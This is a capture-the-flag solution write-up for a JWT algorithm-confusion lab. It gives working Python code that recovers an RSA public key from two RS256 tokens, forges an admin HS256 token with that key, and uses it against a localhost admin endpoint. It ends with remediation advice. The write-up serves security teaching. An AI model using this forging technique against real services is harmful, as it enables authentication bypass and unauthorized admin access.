# Solution - Lab #8: Shadow Key

## Root Cause

`index.js` verifies tokens allowing both RS256 and HS256:

```javascript
function verifyToken(token) {
  return jwt.verify(token, PUBLIC_KEY, { algorithms: ['RS256', 'HS256'] });
}
```

`jsonwebtoken@8.5.1` does not reject an RSA public key PEM when used as an HS256 HMAC secret. An attacker who knows the public key can therefore sign their own HS256 token and have it accepted.

Unlike Lab #4, the public key is not exposed via any API. However, it can be mathematically recovered from any two valid RS256 tokens.

## Exploit Steps

### 1. Collect two RS256 tokens

Login twice to collect two tokens signed with the same RSA private key. The server includes a `jti` (JWT ID) in every token to ensure the payloads differ, so the two RS256 signatures will be distinct.

### 2. Recover the RSA modulus (sig2n)

In RSA-PKCS1v15, a valid signature satisfies `sig^e ≡ em(msg) (mod n)`, where `em` is the PKCS#1 v1.5 padded SHA-256 hash of the signing input and `e = 65537`. Therefore `sig^e - em(msg)` is a multiple of `n`.

Given two signatures from the same key:

```
z1 = sig1^e - em(msg1)  =  k1 * n
z2 = sig2^e - em(msg2)  =  k2 * n
gcd(z1, z2) = gcd(k1, k2) * n
```

For random messages, `gcd(k1, k2) = 1` with high probability, yielding `n` directly. After removing any spurious small factors the recovered modulus is the 2048-bit RSA modulus.

```python
import gmpy2

def pkcs1_sha256_encode(msg, key_bits=2048):
    digest     = hashlib.sha256(msg).digest()
    der_prefix = bytes.fromhex('3031300d060960864801650304020105000420')
    em_len     = key_bits // 8
    pad_len    = em_len - len(der_prefix) - len(digest) - 3
    em         = b'\x00\x01' + b'\xff' * pad_len + b'\x00' + der_prefix + digest
    return gmpy2.mpz(int.from_bytes(em, 'big'))

e = 65537
vals = []
for token in [token1, token2]:
    h, p, s = token.split('.')
    msg     = f'{h}.{p}'.encode()
    sig_int = gmpy2.mpz(int.from_bytes(b64url_dec(s), 'big'))
    em_int  = pkcs1_sha256_encode(msg)
    vals.append(pow(sig_int, e) - em_int)

n = int(gmpy2.gcd(vals[0], vals[1]))
# remove small spurious factors
for prime in [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]:
    while n % prime == 0:
        n //= prime
```

> `gmpy2` (backed by GMP) is required for the large-integer exponentiation to complete in seconds rather than minutes.

### 3. Reconstruct the public key PEM

```python
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

pub = RSAPublicNumbers(e=65537, n=n).public_key()
pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
```

The resulting PEM is byte-for-byte identical to the server's `keys/public.pem`.

### 4. Forge an HS256 token

Sign a new token using the recovered PEM bytes as the HMAC-SHA256 secret:

```python
h   = b64url_enc(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
p   = b64url_enc(json.dumps({'name': 'hacker', 'role': 'admin'}, separators=(',', ':')).encode())
sig = b64url_enc(hmac.new(pem, f'{h}.{p}'.encode(), hashlib.sha256).digest())
token = f'{h}.{p}.{sig}'
```

### 5. Capture the flag

```bash
curl http://localhost:3000/api/admin/users \
  -H "Cookie: session=<forged_token>"
```

Response:

```json
{
  "flag": "FLAG{sh4d0w_k3y_s1gn4tur3_l34ks_pub_k3y}",
  "users": [...]
}
```

## Automated PoC

```bash
pip install requests gmpy2 pwntools cryptography
python poc.py
```

## Takeaway

Two independent flaws combine here:

1. **Algorithm confusion**: `jsonwebtoken@8.5.1` allows using an RSA public key as an HS256 secret. Pinning the allowed algorithm to `['RS256']` closes this.
2. **Public key leakage via signatures**: RS256 signatures are deterministic (PKCS#1 v1.5) and mathematically bind the signature to the modulus. Given two signatures, the modulus is recoverable. Hiding the public key endpoint does not hide the key - it leaks through every signed token.

## References

- [Lab: JWT authentication bypass via algorithm confusion with no exposed key (PortSwigger)](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key) - Lab requiring public key derivation from two tokens before the confusion attack
- [JWT-Key-Recovery - GitHub (FlorianPicca)](https://github.com/FlorianPicca/JWT-Key-Recovery) - Standalone Python tool for recovering the RSA public key from two JWT tokens signed with the same key
- [CVE-2023-48238 - GitHub Advisory](https://github.com/advisories/GHSA-c2ff-88x2-x9pg) - Real-world algorithm confusion CVE showing production impact of this vulnerability class
